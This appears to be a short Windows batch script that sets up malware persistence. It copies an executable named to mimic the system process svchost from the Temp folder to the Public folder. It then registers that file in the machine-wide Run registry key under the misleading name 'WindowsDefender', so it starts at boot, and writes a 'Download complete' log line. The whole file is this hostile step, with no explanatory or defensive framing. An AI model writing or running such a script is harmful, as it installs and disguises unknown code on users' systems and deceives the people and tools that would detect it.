@echo off
copy C:\Windows\Temp\svchost32.exe C:\Users\Public\svchost32.exe
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindowsDefender /t REG_SZ /d "C:\Users\Public\svchost32.exe" /f
echo Download complete > C:\Windows\Temp\log.txt
